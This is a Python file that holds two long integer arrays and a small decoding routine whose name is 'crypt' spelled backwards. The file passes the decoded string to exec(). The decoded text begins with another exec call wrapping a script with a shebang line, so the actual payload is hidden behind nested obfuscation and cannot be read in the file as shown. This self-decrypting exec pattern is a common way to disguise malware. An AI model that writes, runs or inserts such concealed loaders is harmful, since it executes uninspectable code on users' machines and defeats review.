def tpyrc(key_2, key_1):
	key_2 = [int(item) for item in map(lambda x : x + 50, key_2)]
	key_2 = [item for item in map(lambda x, y : x - y, key_2, key_1)]
	def toChar(dato):
		if isinstance(dato, list):
			return [chr(x) for x in dato]
		else:
			return dato.chr()

	new = toChar(key_2)
	plain = "".join(list(map(str, new)))
	return plain
#-------------------------------------------------------------------------------------------------------------
key_1 = [49, 49, 51, 52, 48, 55, 49, 56, 57, 51, 53, 53, 57, 54, 52, 56, 52, 52, 56, 51, 51, 57, 50, 54, 56, 54, 55, 57, 57, 49, 48, 55, 57, 51, 49, 50, 49, 53, 56, 56, 57, 53, 54, 56, 54, 53, 48, 54, 57, 49, 48, 56, 54, 53, 55, 56, 54, 48, 54, 50, 52, 48, 49, 48, 50, 49, 48, 51, 56, 56, 55, 56, 52, 48, 53, 56, 57, 54, 49, 49, 53, 53, 49, 51, 50, 51, 53, 56, 50, 53, 51, 49, 48, 55, 49, 49, 53, 56, 57, 49, 49, 57, 56, 48, 56, 49, 49, 50, 53, 49, 48, 53, 55, 56, 49, 48, 53, 49, 49, 54, 52, 51, 53, 57, 55, 56, 54, 54, 51, 50, 53, 53, 56, 52, 56, 51, 51, 54, 49, 48, 52, 54, 55, 49, 50, 52, 56, 52, 54, 55, 49, 48, 55, 52, 54, 54, 55, 56, 55, 49, 50, 53, 56, 54, 55, 50, 51, 56, 52, 48, 56, 54, 55, 56, 53, 53, 49, 50, 48, 54, 55, 57, 48, 49, 49, 54, 49, 49, 52, 49, 50, 48, 52, 57, 49, 50, 52, 55, 52, 49, 49, 48, 57, 50, 56, 56, 51, 51, 51, 52, 53, 52, 52, 56, 52, 51, 55, 53, 56, 50, 49, 50, 48, 54, 48, 49, 50, 50, 57, 55, 52, 53, 52, 54, 53, 52, 52, 49, 56, 49, 49, 50, 48, 49, 49, 51, 51, 50, 49, 48, 53, 55, 55, 49, 48, 53, 49, 48, 51, 56, 48, 56, 48, 49, 49, 54, 53, 50, 49, 49, 48, 57, 55, 49, 50, 54, 52, 48, 51, 52, 55, 48, 53, 54, 53, 51, 52, 53, 55, 55, 55, 50, 53, 54, 51, 53, 51, 52, 53, 48, 55, 50, 56, 54, 53, 48, 51, 53, 49, 48, 57, 49, 48, 52, 54, 57, 49, 49, 53, 55, 54, 56, 53, 49, 49, 51, 52, 51, 52, 57, 49, 49, 54, 56, 52, 56, 53, 57, 52, 53, 50, 49, 48, 50, 51, 53, 51, 51, 52, 55, 56, 48, 53, 50, 53, 55, 55, 51, 52, 56, 57, 50, 55, 50, 49, 48, 51, 49, 50, 49, 51, 50, 57, 49, 49, 48, 50, 51, 50, 54, 52, 54, 50, 52, 53, 53, 48, 57, 55, 49, 48, 49, 56, 57, 53, 57, 49, 50, 51, 51, 54, 49, 49, 53, 49, 48, 56, 49, 48, 49, 49, 50, 52, 55, 50, 51, 50, 49, 48, 51, 49, 49, 52, 53, 56, 52, 55, 49, 48, 50, 49, 48, 53, 54, 55, 54, 52, 49, 48, 57, 53, 53, 57, 53, 56, 49, 49, 48, 54, 49, 49, 56, 57, 53, 51, 57, 53, 55, 56, 52, 49, 50, 50, 55, 57, 49, 50, 51, 56, 55, 49, 49, 49, 55, 54, 49, 49, 52, 55, 48, 52, 51, 53, 48, 51, 54, 55, 51, 53, 51, 56, 57, 54, 56, 49, 48, 50, 53, 56, 53, 53, 54, 56, 55, 55, 56, 54, 49, 48, 54, 52, 48, 54, 56, 49, 48, 56, 56, 55, 56, 55, 56, 57, 51, 50, 52, 55, 55, 55, 49, 50, 49, 57, 48, 55, 51, 52, 54, 49, 49, 52, 56, 50, 49, 49, 54, 51, 53, 56, 50, 51, 50, 52, 54, 49, 50, 52, 53, 53, 57, 56, 54, 55, 57, 49, 52, 57, 53, 48, 51, 52, 56, 54, 55, 53, 51, 57, 52, 49, 55, 52, 53, 51, 57, 53, 54, 56, 56, 50, 52, 49, 51, 52, 56, 57, 53, 57, 56, 55, 49, 48, 49, 57, 56, 49, 48, 50, 54, 56, 49, 50, 52, 55, 49, 56, 57, 57, 48, 56, 53, 49, 50, 52, 54, 55, 54, 53, 51, 56, 55, 51, 51, 56, 52, 49, 53, 53, 49, 50, 50, 55, 51, 55, 53, 52, 51, 49, 49, 56, 55, 51, 52, 50, 53, 57, 55, 56, 52, 50, 56, 50, 49, 49, 49, 54, 57, 52, 52, 52, 51, 55, 55, 56, 51, 49, 49, 49, 49, 49, 57, 51, 50, 49, 48, 54, 49, 48, 51, 54, 50, 49, 48, 49, 49, 49, 56, 54, 53, 49, 48, 56, 55, 49, 49, 49, 50, 57, 53, 54, 48, 49, 50, 50, 49, 48, 54, 56, 48, 51, 54, 57, 56, 54, 51, 53, 53, 53, 57, 49, 49, 51, 57, 54, 53, 52, 49, 48, 54, 49, 50, 53, 53, 51, 52, 54, 56, 51, 53, 53, 51, 50, 52, 49, 49, 48, 56, 54, 49, 56, 55, 55, 49, 52, 55, 51, 54, 49, 48, 50, 54, 56, 53, 48, 55, 50, 55, 54, 49, 49, 51, 49, 48, 48, 52, 53, 53, 51, 56, 51, 49, 50, 50, 55, 50, 57, 52, 51, 50, 57, 49, 52, 57, 51, 56, 53, 53, 52, 51, 52, 49, 49, 48, 48, 49, 49, 52, 55, 51, 53, 54, 55, 52, 57, 52, 49, 50, 53, 54, 51, 55, 54, 52, 48, 54, 48, 49, 49, 52, 55, 50, 57, 56, 49, 50, 49, 49, 49, 55, 56, 52, 56, 50, 54, 54, 49, 49, 51, 53, 57, 49, 49, 50, 49, 50, 49, 49, 48, 50, 53, 52, 49, 48, 55, 55, 53, 55, 54, 57, 51, 55, 52, 53, 57, 53, 48, 49, 50, 49, 55, 53, 53, 55, 53, 50, 49, 49, 52, 54, 49, 57, 49, 56, 50, 51, 56, 57, 55, 49, 49, 53, 56, 49, 49, 50, 51, 55, 48, 49, 50, 53, 49, 50, 51, 49, 50, 54, 53, 56, 54, 51, 54, 54, 53, 55, 57, 51, 57, 57, 57, 55, 55, 48, 49, 49, 52, 55, 56, 54, 49, 55, 56, 52, 48, 49, 49, 52, 49, 50, 50, 53, 57, 57, 57, 54, 50, 51, 55, 55, 56, 49, 50, 50, 49, 49, 48, 55, 56, 49, 49, 53, 49, 49, 55, 53, 53, 49, 48, 51, 49, 50, 50, 51, 54, 57, 51, 56, 55, 56, 55, 49, 49, 48, 53, 54, 49, 48, 49, 49, 48, 51, 49, 50, 53, 52, 55, 53, 55, 57, 51, 54, 48, 53, 52, 56, 57, 53, 57, 53, 51, 53, 54, 54, 57, 54, 48, 49, 48, 49, 53, 57, 49, 48, 57, 49, 48, 55, 52, 57, 56, 52, 52, 51, 52, 48, 55, 55, 51, 50, 49, 50, 48, 56, 52, 55, 52, 55, 50, 54, 52, 54, 53, 49, 49, 51, 57, 56, 53, 50, 57, 49, 49, 48, 55, 55, 55, 49, 49, 57, 53, 49, 57, 56, 51, 54, 49, 49, 56, 49, 48, 53, 49, 48, 54, 54, 49, 54, 55, 55, 48, 49, 50, 50, 52, 50, 49, 49, 53, 52, 54, 49, 48, 51, 52, 52, 49, 48, 50, 52, 50, 52, 53, 51, 57, 51, 55, 56, 50, 57, 57, 54, 49, 56, 56, 49, 48, 52, 57, 50, 49, 48, 53, 49, 50, 54, 49, 49, 54, 56, 50, 49, 48, 54, 56, 49, 52, 51, 55, 50, 53, 52, 55, 54, 57, 55, 49, 49, 49, 49, 48, 52, 51, 57, 49, 49, 54, 56, 55, 55, 55, 53, 51, 49, 49, 57, 49, 48, 49, 49, 48, 56, 57, 57, 49, 49, 48, 55, 50, 49, 49, 55, 52, 49, 54, 54, 49, 50, 53, 49, 49, 52, 56, 48, 54, 52, 56, 51, 51, 51, 52, 56, 51, 50, 52, 56, 54, 55, 49, 50, 53, 56, 50, 49, 48, 56, 52, 56, 49, 50, 49, 54, 51, 56, 51, 49, 50, 52, 56, 53, 55, 52, 54, 56, 56, 52, 49, 48, 51, 54, 50, 56, 51, 49, 49, 57, 55, 57, 52, 50, 49, 48, 48, 49, 48, 53, 57, 51, 55, 51, 51, 54, 53, 52, 49, 50, 49, 57, 51, 49, 48, 49, 53, 56, 52, 48, 54, 52, 51, 55, 52, 56, 57, 52, 49, 48, 57, 57, 48, 57, 55, 51, 52, 53, 55, 53, 57, 54, 56, 56, 56, 54, 57, 56, 48, 49, 48, 56, 49, 50, 54, 52, 56, 56, 55, 56, 54, 56, 48, 49, 49, 52]
key_2 = [100, 119, 102, 101, 38, 39, 34, 39, 54, 118, 118, 117, 54, 102, 107, 116, 49, 103, 116, 119, 33, 119, 121, 120, 110, 115, 115, 41, 48, 58, 103, 114, 119, 112, 113, 116, 31, 114, 121, 65, 112, 112, 116, 117, 118, 119, 30, 119, 118, 98, 105, 107, 120, 62, 110, 115, 116, 109, 118, 116, 34, 113, 116, 96, 112, 113, 109, 100, 107, 121, 120, 65, 117, 30, 64, 38, 122, 115, 98, 106, 104, 119, 45, 116, 111, 100, 110, 107, 116, 43, 42, 58, 102, 116, 114, 115, 35, 67, 39, 38, 48, 64, 56, 44, 55, 53, 55, 46, 52, 45, 49, 57, 44, 65, 111, 109, 117, 115, 31, 65, 34, 58, 60, 64, 62, 65, 119, 50, 100, 111, 113, 113, 107, 101, 122, 41, 41, 108, 110, 113, 118, 48, 37, 111, 111, 116, 122, 43, 45, 64, 111, 95, 121, 106, 36, 65, 37, 117, 120, 45, 103, 104, 122, 103, 124, 100, 41, 47, 61, 113, 52, 119, 106, 116, 103, 43, 111, 97, 114, 108, 51, 108, 108, 98, 110, 104, 100, 39, 43, 40, 59, 99, 122, 108, 98, 40, 41, 124, 106, 104, 107, 99, 39, 84, 120, 123, 102, 59, 93, 112, 95, 118, 102, 103, 118, 98, 37, 64, 38, 115, 45, 114, 99, 103, 116, 39, 57, 57, 64, 62, 43, 95, 112, 96, 119, 107, 104, 31, 106, 96, 115, 97, 44, 99, 100, 100, 112, 100, 100, 38, 44, 37, 66, 60, 30, 95, 38, 111, 118, 111, 114, 98, 37, 57, 91, 114, 95, 116, 91, 115, 96, 121, 106, 96, 107, 96, 112, 90, 117, 107, 107, 30, 111, 105, 113, 41, 102, 100, 121, 102, 46, 32, 65, 36, 49, 61, 93, 112, 95, 114, 97, 116, 105, 113, 103, 30, 62, 35, 114, 115, 105, 111, 112, 113, 103, 108, 114, 114, 49, 85, 115, 118, 104, 109, 39, 101, 99, 117, 99, 53, 99, 100, 103, 117, 102, 107, 43, 48, 46, 35, 115, 103, 99, 108, 109, 64, 85, 115, 119, 106, 50, 30, 118, 116, 103, 116, 122, 117, 63, 121, 124, 98, 117, 114, 110, 97, 102, 114, 115, 45, 81, 73, 87, 68, 43, 30, 115, 117, 100, 105, 116, 118, 61, 117, 120, 101, 110, 121, 116, 98, 99, 114, 121, 53, 83, 80, 79, 69, 45, 33, 119, 115, 99, 108, 109, 59, 121, 116, 96, 111, 113, 111, 101, 106, 115, 116, 46, 79, 71, 81, 68, 40, 94, 113, 98, 118, 97, 115, 109, 117, 115, 110, 120, 120, 100, 102, 123, 115, 99, 122, 35, 64, 39, 102, 115, 99, 45, 113, 120, 99, 110, 123, 123, 49, 115, 108, 100, 105, 46, 43, 31, 43, 32, 104, 116, 99, 46, 116, 122, 105, 100, 113, 113, 51, 118, 100, 96, 102, 45, 39, 94, 111, 95, 114, 93, 120, 116, 118, 119, 113, 123, 123, 99, 121, 115, 112, 32, 64, 38, 118, 119, 118, 46, 116, 122, 122, 116, 116, 114, 99, 100, 119, 120, 107, 114, 39, 98, 116, 97, 122, 97, 122, 112, 103, 32, 102, 102, 121, 102, 45, 100, 100, 106, 109, 105, 102, 42, 45, 90, 57, 55, 99, 32, 60, 60, 36, 93, 42, 105, 100, 33, 46, 48, 96, 38, 58, 94, 113, 95, 123, 98, 120, 97, 123, 110, 117, 53, 102, 102, 101, 107, 120, 44, 97, 42, 47, 53, 94, 38, 46, 94, 113, 93, 123, 95, 120, 98, 122, 112, 99, 115, 105, 34, 67, 39, 114, 122, 52, 108, 100, 114, 98, 126, 106, 39, 39, 92, 114, 98, 115, 92, 118, 97, 115, 121, 53, 122, 99, 116, 103, 39, 112, 99, 120, 109, 50, 104, 111, 105, 116, 101, 102, 46, 43, 40, 95, 113, 91, 116, 92, 121, 102, 113, 108, 104, 33, 99, 96, 122, 102, 47, 102, 101, 102, 118, 105, 107, 42, 41, 97, 58, 50, 92, 31, 65, 68, 34, 94, 41, 100, 105, 37, 98, 40, 57, 91, 109, 91, 115, 99, 117, 92, 115, 114, 118, 120, 56, 93, 114, 92, 115, 90, 115, 91, 115, 98, 120, 115, 96, 114, 110, 37, 60, 31, 39, 112, 104, 119, 108, 30, 42, 32, 92, 38, 90, 96, 98, 90, 93, 43, 50, 106, 101, 117, 100, 49, 103, 108, 98, 110, 101, 108, 44, 44, 93, 50, 56, 97, 40, 92, 113, 95, 117, 94, 120, 98, 117, 95, 119, 112, 115, 48, 98, 103, 98, 111, 118, 39, 118, 102, 121, 103, 43, 97, 111, 96, 115, 90, 116, 96, 122, 95, 114, 120, 46, 120, 105, 109, 99, 41, 111, 95, 114, 106, 49, 104, 111, 105, 112, 99, 101, 40, 46, 41, 99, 112, 93, 116, 99, 115, 94, 123, 102, 126, 102, 104, 114, 117, 34, 78, 82, 67, 112, 113, 110, 116, 63, 93, 113, 96, 121, 94, 123, 94, 115, 92, 119, 101, 109, 106, 118, 118, 30, 65, 30, 91, 38, 93, 38, 93, 39, 88, 116, 116, 96, 31, 99, 106, 121, 101, 117, 110, 115, 103, 104, 99, 98, 49, 53, 45, 91, 39, 91, 110, 91, 115, 90, 116, 95, 118, 91, 114, 120, 51, 118, 106, 114, 107, 41, 102, 110, 104, 121, 119, 44, 100, 110, 98, 116, 103, 104, 45, 44, 41, 91, 109, 94, 120, 91, 123, 100, 114, 105, 103, 38, 107, 102, 115, 96, 49, 106, 100, 98, 111, 101, 106, 38, 40, 91, 61, 49, 93, 33, 60, 61, 36, 95, 45, 103, 101, 96, 43, 61, 97, 117, 93, 123, 99, 123, 97, 121, 110, 96, 115, 106, 37, 67, 36, 110, 120, 52, 105, 99, 115, 98, 121, 99, 40, 41, 95, 117, 99, 123, 96, 116, 102, 113, 110, 108, 31, 100, 97, 115, 96, 44, 105, 107, 98, 110, 103, 100, 39, 46, 94, 61, 50, 91, 33, 60, 61, 32, 93, 43, 116, 101, 38, 97, 45, 63, 91, 109, 90, 119, 96, 115, 90, 115, 108, 95, 101, 100, 61, 35, 42, 97, 42, 72, 104, 115, 116, 99, 119, 99, 64, 39, 95, 46, 35, 44, 35, 104, 101, 123, 101, 44, 99, 99, 98, 114, 107, 100, 38, 48, 90, 49, 63, 95, 39, 49, 34, 94, 40, 34, 97, 119, 106, 98, 100, 96, 32, 97, 117, 116, 119, 103, 104, 116, 101, 111, 105, 113, 115, 100, 47, 99, 45, 44, 92, 117, 91, 115, 90, 121, 97, 121, 114, 45, 122, 104, 109, 107, 46, 110, 101, 99, 100, 52, 100, 108, 102, 110, 98, 105, 44, 40, 45, 97, 115, 90, 115, 92, 116, 94, 116, 114, 45, 118, 103, 114, 99, 38, 110, 99, 102, 100, 44, 101, 112, 99, 113, 103, 102, 47, 42, 46, 98, 110, 99, 123, 96, 115, 107, 114, 104, 100, 34, 107, 97, 115, 95, 49, 99, 101, 103, 110, 99, 105, 46, 41, 90, 56, 56, 99, 31, 63, 62, 37, 92, 42, 102, 106, 112, 39, 97, 38, 57, 91, 109, 90, 118, 93, 123, 91, 115, 105, 120, 102, 120, 106, 64, 33, 39, 91, 46, 64, 112, 98, 103, 103, 124, 118, 65, 31, 91, 37, 37, 43, 31, 99, 102, 118, 96, 50, 104, 100, 99, 114, 99, 100, 42, 47, 89, 56, 60, 99, 33, 44, 33, 94, 45, 33, 101, 110, 111, 113, 110, 109, 97, 103, 117, 32, 98, 109, 120, 116, 107, 98, 116, 96, 113, 102, 116, 117, 100, 46, 94, 45, 44, 97, 112, 96, 122, 98, 118, 91, 114, 116, 50, 115, 107, 111, 99, 39, 108, 119, 104, 117, 101, 45, 99, 108, 98, 109, 103, 108, 41, 46, 42, 93, 114, 95, 118, 91, 116, 100, 115, 116, 100, 56, 91, 113, 98, 118, 90, 120, 94, 117, 120, 48, 121, 108, 112, 99, 38, 122, 123, 112, 53, 106, 111, 101, 114, 105, 104, 47, 115, 123, 122, 118, 121, 123, 101, 113, 115, 112, 47, 40, 92, 114, 117, 52, 105, 113, 117, 119, 107, 38, 40, 38, 43]
exec(tpyrc(key_2, key_1))